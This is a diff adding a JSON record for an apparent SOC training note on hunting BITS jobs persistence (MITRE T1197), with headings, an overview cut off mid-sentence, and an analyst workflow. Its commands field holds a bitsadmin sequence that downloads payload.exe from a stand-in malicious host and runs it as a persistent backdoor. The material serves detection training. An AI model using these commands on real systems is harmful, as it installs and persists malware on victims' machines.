@@ -1,0 +1,136 @@
+{
+  "id": "hunting persistence (mitre ta0003)/bits jobs persistence (t1197)",
+  "title": "BITS Jobs Persistence (T1197)",
+  "slug": "bits-jobs-persistence-t1197",
+  "relPath": "Hunting Persistence (MITRE TA0003)/BITS Jobs Persistence (T1197).md",
+  "level": "L2",
+  "curriculumLevelId": "l2",
+  "curriculumSectionId": "l2-threat-hunting",
+  "curriculumSectionTitle": "Proactive Threat Hunting",
+  "tags": [
+    "PowerShell",
+    "Windows",
+    "Network",
+    "DFIR",
+    "Detection",
+    "Persistence"
+  ],
+  "mitre": [
+    "T1197",
+    "TA0003"
+  ],
+  "parentId": "hunting persistence (mitre ta0003)",
+  "children": [],
+  "relatedLinks": [],
+  "backlinks": [
+    "hunting persistence (mitre ta0003)"
+  ],
+  "breadcrumbs": [
+    {
+      "id": "hunting persistence (mitre ta0003)",
+      "title": "Hunting Persistence (MITRE TA0003)",
+      "slug": "hunting-persistence-mitre-ta0003"
+    },
+    {
+      "id": "hunting persistence (mitre ta0003)/bits jobs persistence (t1197)",
+      "title": "BITS Jobs Persistence (T1197)",
+      "slug": "bits-jobs-persistence-t1197"
+    }
+  ],
+  "headings": [
+    {
+      "level": 1,
+      "text": "BITS Jobs Persistence (T1197)"
+    },
+    {
+      "level": 3,
+      "text": "Background Intelligent Transfer Service (BITS):"
+    },
+    {
+      "level": 2,
+      "text": "T1197: BITS Jobs Persistence"
+    },
+    {
+      "level": 3,
+      "text": "How Attackers Use BITS for Persistence"
+    },
+    {
+      "level": 2,
+      "text": "Command-Line Tools Used for BITS Abuse"
+    },
+    {
+      "level": 3,
+      "text": "Example: Creating a Malicious BITS Job"
+    },
+    {
+      "level": 2,
+      "text": "Persistence Mechanism"
+    },
+    {
+      "level": 3,
+      "text": "How Attackers Maintain Persistence"
+    },
+    {
+      "level": 3,
+      "text": "Hiding the BITS Job"
+    },
+    {
+      "level": 2,
+      "text": "Detection & Event Monitoring"
+    },
+    {
+      "level": 3,
+      "text": "Key Event IDs to Monitor"
+    },
+    {
+      "level": 2,
+      "text": "Threat Hunting"
+    },
+    {
+      "level": 2,
+      "text": "Summary"
+    }
+  ],
+  "overview": "BITS is a low-bandwidth, asynchronous file transfer service used by Windows applications to download or upload files in the background without disrupting network performance. It is widely used for software updates, messaging applications, and system maintenance. Attackers can exploit BITS to persistently execute code, download malware, or clean up traces of ",
+  "study": {
+    "overview": "BITS is a low-bandwidth, asynchronous file transfer service used by Windows applications to download or upload files in the background without disrupting network performance. It is widely used for software updates, messaging applications, and system maintenance. Attackers can exploit BITS to persistently execute code, download malware, or clean up traces of ",
+    "whySoc": "Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.",
+    "keyConcepts": [
+      "BITS Jobs Persistence (T1197)",
+      "Background Intelligent Transfer Service (BITS):",
+      "T1197: BITS Jobs Persistence",
+      "How Attackers Use BITS for Persistence",
+      "Command-Line Tools Used for BITS Abuse",
+      "Example: Creating a Malicious BITS Job",
+      "Persistence Mechanism",
+      "How Attackers Maintain Persistence",
+      "Hiding the BITS Job",
+      "Detection & Event Monitoring",
+      "Key Event IDs to Monitor",
+      "Threat Hunting"
+    ],
+    "workflow": [
+      "Identify the user, host, process, network flow, or identity object involved.",
+      "Collect the highest-value logs first and preserve timestamps and assumptions.",
+      "Pivot through related notes, telemetry sources, and MITRE references.",
+      "Document findings, gaps, containment options, and detection improvements."
+    ],
+    "splunkExamples": [],
+    "importantCommands": [
+      {
+        "language": "powershell",
+        "code": "bitsadmin /create backdoor\nbitsadmin /addfile backdoor http://malicious.com/payload.exe C:\\Windows\\Temp\\payload.exe\nbitsadmin /SetNotifyCmdLine backdoor \"C:\\Windows\\Temp\\payload.exe\" NULL\nbitsadmin /Resume backdoor"
+      },
+      {
+        "language": "powershell",
+        "code": "bitsadmin /SetNotifyCmdLine backdoor \"C:\\Windows\\Temp\\malware.exe\" NULL"
+      }
+    ],
+    "tools": [
+      "PowerShell"
+    ],
+    "tips": [
+      "BITS jobs can run for up to 90 days by default, with possible extensions."
+    ]
+  }
+}
